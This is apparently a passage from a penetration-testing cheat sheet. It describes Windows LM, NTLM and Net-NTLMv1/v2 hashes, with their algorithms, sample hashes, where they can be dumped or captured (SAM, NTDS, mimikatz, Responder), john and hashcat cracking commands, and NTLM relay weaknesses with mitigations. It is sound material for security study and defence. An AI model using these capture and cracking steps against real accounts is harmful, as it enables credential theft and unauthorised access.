- If a `Hash` starts with `31d6`, chances are pretty good, that there is no `Password`
set for the user.

#### LM

- `Oldest` password storage used by `Microsoft Windows`
- If available, they can be obtained from `SAM` databases on a `Microsoft Windows` system or from the `NTDS` database of a `Domain Controller`
- When dumping `SAM/NTDS` databases, they are shown together within the `NTHash` before the colon
- Can be used for `Pass-The-Hash`

##### Example

```console
299BD128C1101FD6
```

##### Algorithm

1. Convert all `lower case` to `upper case`
2. Pad password to `14` characters with NULL characters
3. Split the password to two `7` character chunks
4. Create two `DES` keys from each `7` character chunk
5. DES `encrypt` the string "KGS!@#$%" with these two `chunks`
6. `Concatenate` the two DES encrypted strings. This is the LM hash.

##### Cracking

```console
$ john --format=lm <FILE>
$ hashcat -m 3000 -a 3 <FILE>
```

#### NTHash (NTLM)

- The way how passwords are stored on `modern` `Microsoft Windows` systems
- Can be optained by dumping the `SAM` database or using `mimikatz`
- They are also stored in the `NTDS` file on `Domain Cotnrollers`
- Can be used for `Pass-The-Hash`

##### Example

```console
B4B9B02E6F09A9BD760F388B67351E2B
```

##### Algorithm

```console
MD4(UTF-16-LE(password))
```

##### Cracking

```console
$ john --format=nt <FILE>
$ hashcat -m 1000 -a 3 <FILE>
```

#### Net-NTLMv1 (NTLMv1)

- `NTLM` protocol uses the `NTHash` in `Challenge-Response` between a `server` and a `client`
- The `v1` of the protocol uses both, the `NT` hash and the `LM` hash, depending on configuration and what is available.
- Can be obtained by using `Responder`
- Values for cracking are `K1`, `K2` or `K3` from the algorithm
- Version 1 is `deprecated` but still used in some old systems on the network
- Can be used for `Relaying`

##### Example

```console
u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c
```

##### Algorithm

```console
C = 8-byte server challenge, random
K1 | K2 | K3 = LM/NT-hash | 5-bytes-0
response = DES(K1,C) | DES(K2,C) | DES(K3,C)
```

##### Cracking

```console
$ john --format=netntlm <FILE>
$ hashcat -m 5500 -a 3 <FILE>
```

#### Net-NTLMv2 (NTLMv2)

- New and improved version of the `NTLM` protocol
- Harder to crack
- Same concept as `NTLMv1`, only with a different algorithm and response sent to the server
- Can also be captured by using `Responder`
- Default in Microsoft Windows since `Microsoft Windows 2000`
- Can be used for `Relaying`

##### Example

```console
admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030
```

##### Algorithm

```console
SC = 8-byte server challenge, random
CC = 8-byte client challenge, random
CC* = (X, time, CC2, domain name)
v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)
LMv2 = HMAC-MD5(v2-Hash, SC, CC)
NTv2 = HMAC-MD5(v2-Hash, SC, CC*)
response = LMv2 | CC | NTv2 | CC*
```

```console
$ john --format=netntlmv2 <FILE>
$ hashcat -m 5600 -a 3 <FILE>
```

### NTLM Protocol Vulnerabilities

#### NTLMv1

**Vulnerability:** Can be cracked with rainbow tables

**Mitigation:** Use Security Support Provider (SSP) which contains Extended Session Security (ESS)

**Fixed Protocol:** NTLMv1-SSP

#### NTLMv2 (with Drop the MIC CVE)

**Vulnerability:** Cross-protocol Relay (SMB > LDAP)

**Mitigation:** Implement Message Integrity Check (MIC)

**Fixed Protocol:** NTLMv2 (patched)

#### All NTLM Versions

**Vulnerabilities:** Relay attacks

**Mitigations (Server-Side):**

1. Signing
2. Extended Protection for Authentication (EPA)
   - Service binding
   - Channel binding

**Note:** These are server-side mitigations and no fully fixed protocol exists for all relay scenarios.
